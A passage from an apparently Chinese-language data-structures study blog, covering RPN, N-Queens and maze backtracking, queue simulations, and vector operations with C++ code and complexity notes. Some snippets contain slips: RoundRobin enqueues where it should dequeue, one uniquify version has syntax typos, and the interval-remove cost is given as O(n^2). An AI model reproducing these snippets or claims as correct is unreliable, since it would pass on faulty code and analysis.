<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">append</span> <span class="params">( <span class="keyword">char</span>*&amp; rpn, <span class="keyword">float</span> opnd )</span> </span>&#123; <span class="comment">//将操作数接至RPN末尾</span></span><br><span class="line">   <span class="keyword">int</span> n = <span class="built_in">strlen</span> ( rpn ); <span class="comment">//RPN当前长度（以&#x27;\0&#x27;结尾，长度n + 1）</span></span><br><span class="line">   <span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line">   <span class="keyword">if</span> ( opnd != ( <span class="keyword">float</span> ) ( <span class="keyword">int</span> ) opnd ) <span class="built_in">sprintf</span> ( buf, <span class="string">&quot;%.2f \0&quot;</span>, opnd ); <span class="comment">//浮点格式，或</span></span><br><span class="line">   <span class="keyword">else</span>                          <span class="built_in">sprintf</span> ( buf, <span class="string">&quot;%d \0&quot;</span>, ( <span class="keyword">int</span> ) opnd ); <span class="comment">//整数格式</span></span><br><span class="line">   rpn = ( <span class="keyword">char</span>* ) <span class="built_in">realloc</span> ( rpn, <span class="keyword">sizeof</span> ( <span class="keyword">char</span> ) * ( n + <span class="built_in">strlen</span> ( buf ) + <span class="number">1</span> ) ); <span class="comment">//扩展空间</span></span><br><span class="line">   <span class="built_in">strcat</span> ( rpn, buf ); <span class="comment">//RPN加长</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">append</span> <span class="params">( <span class="keyword">char</span>*&amp; rpn, <span class="keyword">char</span> optr )</span> </span>&#123; <span class="comment">//将运算符接至RPN末尾</span></span><br><span class="line">   <span class="keyword">int</span> n = <span class="built_in">strlen</span> ( rpn ); <span class="comment">//RPN当前长度（以&#x27;\0&#x27;结尾，长度n + 1）</span></span><br><span class="line">   rpn = ( <span class="keyword">char</span>* ) <span class="built_in">realloc</span> ( rpn, <span class="keyword">sizeof</span> ( <span class="keyword">char</span> ) * ( n + <span class="number">3</span> ) ); <span class="comment">//扩展空间</span></span><br><span class="line">   <span class="built_in">sprintf</span> ( rpn + n, <span class="string">&quot;%c &quot;</span>, optr ); rpn[n + <span class="number">2</span>] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">//接入指定的运算符</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>RPN表达式无需括号即可确定运算优先级，是否意味着所占空间必少于常规表达式</p>
</blockquote>
<p>未必，尽管RPN表达式可省去括号，但是必须在相邻的操作数、操作符之间插入特定的分隔符(通常为空格)。这种分隔符必须事先约定，且不能用以表示操作符和操作数，故称为元字符。引入元字符的数目与操作数和操作符的数目相当，故所占空间未必少于原表达式。</p>
<blockquote>
<p>既然evaluate()算法已经可以求值，同时完成RPN转换有何意义</p>
</blockquote>
<p>同样长度（指同样多操作数）的 RPN 比中缀表达式算得快。</p>
<p>若每个操作数都是一个具体的数，把中缀表达式转成 RPN 的过程已经足以得到中缀表达式的值，这种情况下转成 RPN 再计算得不偿失。</p>
<p>但是，操作数可能是一个未知数。例如中缀表达式 <code>(a + b) * c</code> 分别代入 n 组具体数字计算表达式值，例如代入 <code>(a=1,b=2,c=3)</code> 、 <code>(a=4,b=5,c=6)</code> 、 <code>(a=10,b=11,c=12)</code> 求值。不转就要算 n 次中缀表达式，转就只要转 1 次 + 算 n 次 RPN 。</p>
<blockquote>
<p>逆波兰表达式的优点</p>
</blockquote>
<ul>
<li>当有操作符时就计算，因此，表达式并不是从右至左整体计算而是每次由中心向外计算一部分，这样在复杂运算中就很少导致操作符错误。</li>
<li>堆栈自动记录中间结果，这就是为什么逆波兰计算器能容易对任意复杂的表达式求值。与普通科学计算器不同，它对表达式的复杂性没有限制。</li>
<li>逆波兰表达式中不需要括号，用户只需按照表达式顺序求值，让堆栈自动记录中间结果；同样的，也不需要指定操作符的优先级。</li>
<li>机器状态永远是一个堆栈状态，堆栈里是需要运算的操作数，栈内不会有操作符。</li>
</ul>
<h2 id="试探回溯法"><a href="#试探回溯法" class="headerlink" title="试探回溯法"></a>试探回溯法</h2><p>根据候选解的某些局部特征，即可判断其是否合理，以候选解的子集为单位批量地删除称为剪枝。</p>
<p><strong>试探回溯模式</strong></p>
<p>从0开始，逐渐增加候选解长度，一旦发现注定要失败，则收缩至前以长度，并继续试探。</p>
<p><strong>N皇后问题</strong></p>
<blockquote>
<p>在n*n的棋盘上放置n个皇后，使得她们互不攻击</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">placeQueens</span> <span class="params">( <span class="keyword">int</span> N )</span> </span>&#123; <span class="comment">//N皇后算法（迭代版）：采用试探/回溯的策略，借助栈记录查找的结果</span></span><br><span class="line">   Stack&lt;Queen&gt; solu; <span class="comment">//存放（部分）解的栈</span></span><br><span class="line">   <span class="function">Queen <span class="title">q</span> <span class="params">( <span class="number">0</span>, <span class="number">0</span> )</span></span>; <span class="comment">//从原点位置出发</span></span><br><span class="line">   <span class="keyword">do</span> &#123; <span class="comment">//反复试探、回溯</span></span><br><span class="line">      <span class="keyword">if</span> ( N &lt;= solu.size() || N &lt;= q.y ) &#123; <span class="comment">//若已出界，则</span></span><br><span class="line">         q = solu.pop(); q.y++; <span class="comment">//回溯一行，并继续试探下一列</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; <span class="comment">//否则，试探下一行</span></span><br><span class="line">         <span class="keyword">while</span> ( ( q.y &lt; N ) &amp;&amp; ( <span class="number">0</span> &lt;= solu.find ( q ) ) ) <span class="comment">//通过与已有皇后的比对</span></span><br><span class="line">            <span class="comment">/*DSA*/</span><span class="comment">//while ((q.y &lt; N) &amp;&amp; (solu.find(q))) //（若基于List实现Stack，则find()返回值的语义有所不同）</span></span><br><span class="line">            &#123; q.y++; nCheck++; &#125; <span class="comment">//尝试找到可摆放下一皇后的列</span></span><br><span class="line">         <span class="keyword">if</span> ( N &gt; q.y ) &#123; <span class="comment">//若存在可摆放的列，则</span></span><br><span class="line">            solu.push ( q ); <span class="comment">//摆上当前皇后，并</span></span><br><span class="line">            <span class="keyword">if</span> ( N &lt;= solu.size() ) nSolu++; <span class="comment">//若部分解已成为全局解，则通过全局变量nSolu计数</span></span><br><span class="line">            q.x++; q.y = <span class="number">0</span>; <span class="comment">//转入下一行，从第0列开始，试探下一皇后</span></span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">while</span> ( ( <span class="number">0</span> &lt; q.x ) || ( q.y &lt; N ) ); <span class="comment">//所有分支均已或穷举或剪枝之后，算法结束</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>迷宫寻径</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">labyrinth</span> <span class="params">( Cell Laby[LABY_MAX][LABY_MAX], Cell* s, Cell* t )</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> ( ( AVAILABLE != s-&gt;status ) || ( AVAILABLE != t-&gt;status ) ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//退化情况</span></span><br><span class="line">   Stack&lt;Cell*&gt; path; <span class="comment">//用栈记录通路（Theseus的线绳）</span></span><br><span class="line">   s-&gt;incoming = UNKNOWN; s-&gt;status = ROUTE; path.push ( s ); <span class="comment">//起点</span></span><br><span class="line">   <span class="keyword">do</span> &#123; <span class="comment">//从起点出发不断试探、回溯，直到抵达终点，或者穷尽所有可能</span></span><br><span class="line">      <span class="comment">/*DSA*/</span>displayLaby(); <span class="comment">/*path.traverse(printLabyCell); printLabyCell(path.top());*/</span> getchar();</span><br><span class="line">      Cell* c = path.top(); <span class="comment">//检查当前位置（栈顶）</span></span><br><span class="line">      <span class="keyword">if</span> ( c == t ) <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//若已抵达终点，则找到了一条通路；否则，沿尚未试探的方向继续试探</span></span><br><span class="line">      <span class="keyword">while</span> ( NO_WAY &gt; ( c-&gt;outgoing = nextESWN ( c-&gt;outgoing ) ) ) <span class="comment">//逐一检查所有方向</span></span><br><span class="line">         <span class="keyword">if</span> ( AVAILABLE == neighbor ( c )-&gt;status ) <span class="keyword">break</span>; <span class="comment">//试图找到尚未试探的方向</span></span><br><span class="line">      <span class="keyword">if</span> ( NO_WAY &lt;= c-&gt;outgoing ) <span class="comment">//若所有方向都已尝试过</span></span><br><span class="line">         &#123; c-&gt;status = BACKTRACKED; c = path.pop(); &#125;<span class="comment">//则向后回溯一步</span></span><br><span class="line">      <span class="keyword">else</span> <span class="comment">//否则，向前试探一步</span></span><br><span class="line">         &#123; path.push ( c = advance ( c ) ); c-&gt;outgoing = UNKNOWN; c-&gt;status = ROUTE; &#125;</span><br><span class="line">   &#125; <span class="keyword">while</span> ( !path.empty() );</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><p>与栈一样，队列也是存放数据对象的一种容器，其中的数据对象也按线性逻辑次序排列。同样只允许在队列两端进行操作，若插入对象只能从其中某一端，而删除只能从另外一端，将允许取出元素的一头称为队首，另外一端称为队尾。队列中各对象的操作次序遵循先进先出的规律：更早出队的元素应为更早入队者。</p>
<h1 id="队列的应用"><a href="#队列的应用" class="headerlink" title="队列的应用"></a>队列的应用</h1><h2 id="循环分配器"><a href="#循环分配器" class="headerlink" title="循环分配器"></a>循环分配器</h2><p>一群客户共享同一资源时，按照先来后到的顺序分配资源，例如多个应用程序共享cpu，实验室成员共享打印机</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">RoundRobin&#123;</span><br><span class="line">     <span class="function">Queue <span class="title">Q</span><span class="params">(clients)</span></span>;</span><br><span class="line">     <span class="keyword">while</span>(!ServiceClosed())&#123;</span><br><span class="line">         e=	Q.enqueue();</span><br><span class="line">         serve(e);</span><br><span class="line">         Q.enqueue(e);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="银行服务模拟"><a href="#银行服务模拟" class="headerlink" title="银行服务模拟"></a>银行服务模拟</h2><p>以银行这一典型场景为例，利用队列结构实现队顾客服务的调度和优化。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">simulate</span> <span class="params">( <span class="keyword">int</span> nWin, <span class="keyword">int</span> servTime )</span> </span>&#123; <span class="comment">//按指定窗口数、服务总时间模拟银行业务</span></span><br><span class="line">   Queue&lt;Customer&gt;* windows = <span class="keyword">new</span> Queue&lt;Customer&gt;[nWin]; <span class="comment">//为每一窗口创建一个队列</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> now = <span class="number">0</span>; now &lt; servTime; now++ ) &#123; <span class="comment">//在下班之前，每隔一个单位时间</span></span><br><span class="line">      <span class="keyword">if</span> ( rand() % ( <span class="number">1</span> + nWin ) ) &#123; <span class="comment">//新顾客以nWin/(nWin + 1)的概率到达</span></span><br><span class="line">         Customer c ; c.time = <span class="number">1</span> + rand() % <span class="number">98</span>; <span class="comment">//新顾客到达，服务时长随机确定</span></span><br><span class="line">         c.window = bestWindow ( windows, nWin ); <span class="comment">//找出最佳（最短）的服务窗口/*DSA*/ToDo: 更精细的策略</span></span><br><span class="line">         windows[c.window].enqueue ( c ); <span class="comment">//新顾客加入对应的队列</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nWin; i++ ) <span class="comment">//分别检查</span></span><br><span class="line">         <span class="keyword">if</span> ( !windows[i].empty() ) <span class="comment">//各非空队列</span></span><br><span class="line">            <span class="keyword">if</span> ( -- windows[i].front().time &lt;= <span class="number">0</span> ) <span class="comment">//队首顾客的服务时长减少一个单位</span></span><br><span class="line">               windows[i].dequeue(); <span class="comment">//服务完毕的顾客出列，由后继顾客接替</span></span><br><span class="line">   &#125; <span class="comment">//for</span></span><br><span class="line">   <span class="keyword">delete</span> [] windows; <span class="comment">//释放所有队列（此前，~List()会自动清空队列）</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bestWindow</span> <span class="params">( Queue&lt;Customer&gt; windows[], <span class="keyword">int</span> nWin )</span> </span>&#123; <span class="comment">//为新到顾客确定最佳队列</span></span><br><span class="line">   <span class="keyword">int</span> minSize = windows[<span class="number">0</span>].size(), optiWin = <span class="number">0</span>; <span class="comment">//最优队列（窗口）</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nWin; i++ ) <span class="comment">//在所有窗口中</span></span><br><span class="line">      <span class="keyword">if</span> ( minSize &gt; windows[i].size() ) <span class="comment">//挑选出</span></span><br><span class="line">         &#123; minSize = windows[i].size(); optiWin = i; &#125; <span class="comment">//队列最短者</span></span><br><span class="line">   <span class="keyword">return</span> optiWin; <span class="comment">//返回</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>




]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>向量</title>
    <url>/algorithm/vector/</url>
    <content><![CDATA[<p>在导论中，我们了解到数据结构是若干数据项的结构化集合，其结构性表现为数据项之间的某种逻辑次序。根据这种逻辑次序的复杂程度可大致将数据结构分为线性、半线性、非线性结构三大类。在线性结构中，各数据项按照一个线性次序组织为一个整体。在向量中，所有数据项的物理存放位置与其逻辑次序完全吻合。</p>
<a id="more"></a>

<p>在C/C++语言中，数组支持对一组相关元素的存储组织和访问操作。若集合S由$n$个元素组成，则可将它们存放于起始于地址A、物理地址连续的一段存储空间，并统称为数组。数组A[]中每一元素都唯一对应于某一下标编号。反之，每个元素均由非负编号唯一指代，并可直接访问。</p>
<p>向量是数组的抽象与泛化，由一组元素按线性次序封装而成，各元素与[0,n)内的秩一一对应。</p>
<h1 id="静态空间管理"><a href="#静态空间管理" class="headerlink" title="静态空间管理"></a>静态空间管理</h1><p>内部数组所占物理空间的容量，若在向量的生命周期内不允许调整，则称为静态空间管理策略。</p>
<p><strong>上溢</strong>  数组不足以存放所有元素，尽管系统此时仍有足够的空间</p>
<p><strong>下溢</strong> 元素寥寥无几，即装填因子(向量实际规模和内部数组容量的比值)远远小于50%.</p>
<h1 id="动态空间管理"><a href="#动态空间管理" class="headerlink" title="动态空间管理"></a>动态空间管理</h1><p>一般的应用环境难以准确预测空间的需求量，使向量可随实际需求动态调整容量，在即将发生上溢时适当扩大向量的容量。</p>
<h2 id="可扩充向量"><a href="#可扩充向量" class="headerlink" title="可扩充向量"></a>可扩充向量</h2><p><strong>倍增策略</strong>  每次新数组的容量总是取作原数组的两倍</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">void</span> Vector&lt;T&gt;::expand() &#123; <span class="comment">//向量空间不足时扩容</span></span><br><span class="line">   <span class="keyword">if</span> ( _size &lt; _capacity ) <span class="keyword">return</span>; <span class="comment">//尚未满员时，不必扩容</span></span><br><span class="line">   <span class="keyword">if</span> ( _capacity &lt; DEFAULT_CAPACITY ) _capacity = DEFAULT_CAPACITY; <span class="comment">//不低于最小容量</span></span><br><span class="line">   T* oldElem = _elem;  _elem = <span class="keyword">new</span> T[_capacity &lt;&lt;= <span class="number">1</span>]; <span class="comment">//容量加倍</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; _size; i++ )</span><br><span class="line">      _elem[i] = oldElem[i]; <span class="comment">//复制原向量内容（T为基本类型，或已重载赋值操作符&#x27;=&#x27;）</span></span><br><span class="line">   <span class="keyword">delete</span> [] oldElem; <span class="comment">//释放原空间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最坏情况：在初始容量为0的空向量中，连续插入$n=mI&gt;&gt;2$个元素</p>
<p>于是在第$1，2,4,8…$次插入时都需扩容，</p>
<p>即便不计申请空间操作，各次扩容过程中复制原向量的时间成本依次为</p>
<p>$1,2,4,8,…,2^m=n$</p>
<p>总体耗时$O(n)$,每次扩容的分摊成本为O(1)</p>
<p><strong>递增策略</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">T* oldElem = _elem;  _elem = <span class="keyword">new</span> T[_capacity+increment]; </span><br></pre></td></tr></table></figure>
<p>最坏情况：在初始容量为0的空向量中，连续插入$n=mI&gt;&gt;2$个元素</p>
<p>于是在第$1，I+1,2I+1,3I+1…$次插入时都需扩容，</p>
<p>即便不计申请空间操作，各次扩容过程中复制原向量的时间成本依次为</p>
<p>$0,I,2I,3I,..(m-1)I$</p>
<p>每次扩容的分摊成本为$O(n)$</p>
<h2 id="分摊分析"><a href="#分摊分析" class="headerlink" title="分摊分析"></a>分摊分析</h2><blockquote>
<p>平均分析和分摊分析</p>
</blockquote>
<p><strong>平均复杂度</strong> </p>
<p>在假定各种输入实例的出现符合某种概率分布后，对对应成本加权平均。</p>
<p>各种可能的操作，作为独立事件分别考查，割裂了操作之间的相关性和连贯性</p>
<p>往往不能准确地评价数据结构和算法的平均性能</p>
<p><strong>分摊复杂度</strong></p>
<p>对数据结构连续地实施足够多次操作，所需总体成本分摊至单次操作</p>
<p>从实际可行的角度，对一系列操作做整体的考量</p>
<p>更加忠实得刻画了可能出现的操作序列</p>
<p>更为精准地评判数据结构和算法地真实性能</p>
<p>条件不规整时，可添加约束，比如$n=2^k$</p>
<h1 id="无序向量"><a href="#无序向量" class="headerlink" title="无序向量"></a>无序向量</h1><h2 id="置乱算法"><a href="#置乱算法" class="headerlink" title="置乱算法"></a>置乱算法</h2><p>在软件模拟、仿真测试等应用中，随机向量的生成都是一项至关重要的操作。理论上说，调用permute可以枚举出同一向量所有可能的排列，而且能够保证生成各种序列的概率相等。但是基于种子的伪随机数发生器无法保证所生成随机数之间的独立性，所以无法等可能地生成所有排列。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">void</span> <span class="title">permute</span> <span class="params">( Vector&lt;T&gt;&amp; V )</span> </span>&#123; <span class="comment">//随机置乱向量，使各元素等概率出现于各位置</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> i = V.size(); i &gt; <span class="number">0</span>; i-- ) <span class="comment">//自后向前</span></span><br><span class="line">      swap ( V[i - <span class="number">1</span>], V[rand() % i] ); <span class="comment">//V[i - 1]与V[0, i)中某一随机元素交换</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//无序向量的顺序查找：返回最后一个元素e的位置；失败时，返回lo - 1</span></span><br><span class="line">Rank Vector&lt;T&gt;::find ( T <span class="keyword">const</span>&amp; e, Rank lo, Rank hi ) <span class="keyword">const</span> &#123; <span class="comment">//assert: 0 &lt;= lo &lt; hi &lt;= _size</span></span><br><span class="line">   <span class="keyword">while</span> ( ( lo &lt; hi-- ) &amp;&amp; ( e != _elem[hi] ) ); <span class="comment">//从后向前，顺序查找</span></span><br><span class="line">   <span class="keyword">return</span> hi; <span class="comment">//若hi &lt; lo，则意味着失败；否则hi即命中元素的秩</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>约定在命中多个元素时可返回秩最大者</p>
<p>输入敏感算法，,最好$O(1)$,最差$O(n)$</p>
<h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//将e作为秩为r元素插入</span></span><br><span class="line">Rank Vector&lt;T&gt;::insert ( Rank r, T <span class="keyword">const</span>&amp; e ) &#123; <span class="comment">//assert: 0 &lt;= r &lt;= size</span></span><br><span class="line">   expand(); <span class="comment">//若有必要，扩容</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> i = _size; i &gt; r; i-- ) _elem[i] = _elem[i<span class="number">-1</span>]; <span class="comment">//自后向前，后继元素顺次后移一个单元</span></span><br><span class="line">   _elem[r] = e; _size++; <span class="comment">//置入新元素并更新容量</span></span><br><span class="line">   <span class="keyword">return</span> r; <span class="comment">//返回秩</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了避免元素被覆盖，自后向前对元素操作。时间复杂度主要取决于后继元素的后移，故总体为$O(size-r+1)$，r取最大值size时只需$O(1)$时间，r取最小值时需要$O(size)$时间，平均时间正比于向量规模。</p>
<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p><strong>区间删除</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">int</span> Vector&lt;T&gt;::remove ( Rank lo, Rank hi ) &#123; <span class="comment">//删除区间[lo, hi)</span></span><br><span class="line">   <span class="keyword">if</span> ( lo == hi ) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//出于效率考虑，单独处理退化情况，比如remove(0, 0)</span></span><br><span class="line">   <span class="keyword">while</span> ( hi &lt; _size ) _elem[lo++] = _elem[hi++]; <span class="comment">//[hi, _size)顺次前移hi - lo个单元</span></span><br><span class="line">   _size = lo; <span class="comment">//更新规模，直接丢弃尾部[lo, _size = hi)区间</span></span><br><span class="line">   shrink(); <span class="comment">//若有必要，则缩容</span></span><br><span class="line">   <span class="keyword">return</span> hi - lo; <span class="comment">//返回被删除元素的数目</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>单元素删除可视为区间删除操作的特例</p>
<p>此处自前向后的顺序不可颠倒，否则在后继元素多于待删除元素后部分单元会相互覆盖。每次操作正比于删除区间的后缀长度$=n-hi=O(n)$，与被删除区间本身的长度无关，循环次数等于区间宽度$=hi-lo=O(n)$,总体复杂度为$O(n^2)$</p>
<p><strong>单元素删除</strong></p>
<p>时间复杂度$O(n-r)$，被删除元素在向量中的位置越靠后所需的时间越短，最好为$O(1)$,最坏为$O(n)$</p>
<h2 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h2><p>应用实例：以网络搜索引擎为例，多个计算节点各自获得的局部搜索结果需首先剔除其中重复的部分，方可汇总成一份完整的报告。</p>
<p><strong>错误版</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">int</span> Vector&lt;T&gt;::deduplicate() &#123; <span class="comment">//删除无序向量中重复元素（错误版）</span></span><br><span class="line">   <span class="keyword">int</span> oldSize = _size; <span class="comment">//记录原规模</span></span><br><span class="line">   <span class="keyword">for</span> ( Rank i = <span class="number">1</span>; i &lt; _size; i++ ) &#123; <span class="comment">//逐一考查_elem[i]</span></span><br><span class="line">      Rank j = find ( _elem[i], <span class="number">0</span>, i ); <span class="comment">//在_elem[i]的前驱中寻找与之雷同者（至多一个）</span></span><br><span class="line">      <span class="keyword">if</span> ( <span class="number">0</span> &lt;= j ) remove ( j ); <span class="comment">//若存在，则删除之（但在此种情况，下一迭代不必做i++）</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> oldSize - _size; <span class="comment">//向量规模变化量，即被删除元素总数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在前驱存在相同元素时，删除该元素时该元素所有后继均会向前移动一个单位，所以此时$i$不必后移，后移将会跳过元素，此算法错误。</p>
<p><strong>繁琐版</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">int</span> Vector&lt;T&gt;::deduplicate() &#123; <span class="comment">//删除无序向量中重复元素（繁琐版）</span></span><br><span class="line">   <span class="keyword">int</span> oldSize = _size; <span class="comment">//记录原规模</span></span><br><span class="line">   <span class="keyword">int</span> i = <span class="number">-1</span>; <span class="comment">//从最前端开始</span></span><br><span class="line">   <span class="keyword">while</span> ( ++i &lt; _size - <span class="number">1</span> ) &#123; <span class="comment">//从前向后，逐一</span></span><br><span class="line">      <span class="keyword">int</span> j = i + <span class="number">1</span>; <span class="comment">//assert: _elem[0, i]中不含重复元素</span></span><br><span class="line">      <span class="keyword">while</span> ( j &lt; _size )</span><br><span class="line">         <span class="keyword">if</span> ( _elem[i] == _elem[j] ) remove ( j ); <span class="comment">//若雷同，则删除后者</span></span><br><span class="line">         <span class="keyword">else</span> j++; <span class="comment">//并继续扫描</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> oldSize - _size; <span class="comment">//向量规模变化量，即被删除元素总数</span></span><br></pre></td></tr></table></figure>
<p>此算法在处理时不同于前一方法，在雷同元素中删除后者，避免了跳过元素的问题，元素的移动操作与之前的算法相比也有所减少,同时查找操作会有所增加。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">int</span> Vector&lt;T&gt;::deduplicate() &#123; </span><br><span class="line">   <span class="keyword">int</span> oldSize = _size; <span class="comment">//记录原规模</span></span><br><span class="line">   <span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line">   <span class="keyword">while</span>(i&lt;size)</span><br><span class="line">	   find(_elem[i],<span class="number">0</span>,i)&lt;<span class="number">0</span> ? i++ :remove(i);</span><br><span class="line">   <span class="keyword">return</span> oldSize - _size; <span class="comment">//向量规模变化量，即被删除元素总数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>算法分析</p>
</blockquote>
<p><strong>正确性</strong> 凡被剔除者均为重复元素(不多)，故只需证明，算法不致遗漏重复元素(不少)。</p>
<p><strong>不变性</strong> 在当前元素V[i]的前缀V[0,i)中，各元素彼此互异 </p>
<p><strong>单调性</strong> 随着反复的while迭代，</p>
<ol>
<li>当前元素的前缀长度单调非降，且迟早增至size</li>
<li>当前元素后缀的长度单调下降，且迟早降至0</li>
</ol>
<p>故算法必然终止，且至多迭代$O(n)$轮</p>
<p><strong>复杂度</strong> 每轮迭代中<code>find()</code>和<code>remove()</code>累计耗费线性时间，总体$O(n^2)$</p>
<p>即便在最好情况下，仍然需要运行$\Omega(n^2)$时间，每次迭代都需要做一次查找操作和一次可能的删除操作，对于_elem[k],若需要做删除操作，为此需花费$O(n-k)$，反之，若不需要做删除操作，则此前的查找操作以失败告终，其间已花费了$O(k)$时间，无论如何，每次迭代需要$\Omega(min(n-k,k))$时间，累计为$\Omega (n^2)$</p>
<ul>
<li>仿照<code>uniquify</code>高效版思路，元素移动的次数可降低至$O(n)$，但是比较次数仍然是$O(n^2)$。在发现重复元素后不必立即剔除，借助位图结构先对需删除的重复元素标记，然后再统一删除，稳定性保持，但是查找长度更长，从而导致更多比对操作。时间消耗主要来源于静态的比较操作，所以实际运行时间仍将大幅提高。</li>
</ul>
<p><strong>改进方法</strong></p>
<p>可先对无序向量进行排序，后再调用有序向量的唯一化方法，总时间为$O(nlogn)+O(n)=O(nlogn)$</p>
<h1 id="有序向量"><a href="#有序向量" class="headerlink" title="有序向量"></a>有序向量</h1><h2 id="有序性"><a href="#有序性" class="headerlink" title="有序性"></a>有序性</h2><p>有序/无序序列中，任意/总有一对相邻元素顺序/逆序。</p>
<p>因此，相邻逆序对的数目，在一定程度上可用来度量向量的逆序程度。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;  <span class="keyword">int</span> Vector&lt;T&gt;::disordered() <span class="keyword">const</span> &#123; <span class="comment">//返回向量中逆序相邻元素对的总数</span></span><br><span class="line">   <span class="keyword">int</span> n = <span class="number">0</span>; <span class="comment">//计数器</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">1</span>; i &lt; _size; i++ ) <span class="comment">//逐一检查_size - 1对相邻元素</span></span><br><span class="line">      <span class="keyword">if</span> ( _elem[i - <span class="number">1</span>] &gt; _elem[i] ) n++; <span class="comment">//逆序则计数</span></span><br><span class="line">   <span class="keyword">return</span> n; <span class="comment">//向量有序当且仅当n = 0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="唯一化"><a href="#唯一化" class="headerlink" title="唯一化"></a>唯一化</h2><p><strong>低效算法</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">int</span> Vector&lt;T&gt;::uniquify() &#123; </span><br><span class="line">   <span class="keyword">int</span> oldsize=_size,<span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line">   <span class="keyword">while</span>(i&lt;_size)</span><br><span class="line">     _elem[i<span class="number">-1</span>]==elem[i]?remove[i]:i++;</span><br><span class="line">   <span class="keyword">return</span> oldsize-_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行时间主要取决于<code>while</code>循环次数，共计数$n-1$次</p>
<p>最坏情况下，每次都需要调用<code>remove()</code>,各自耗时$O(n-1)$~$O(1)$，累计$O(n^2)$</p>
<p>低效的根源在于同一元素可作为被删除元素的后继多次被前移。</p>
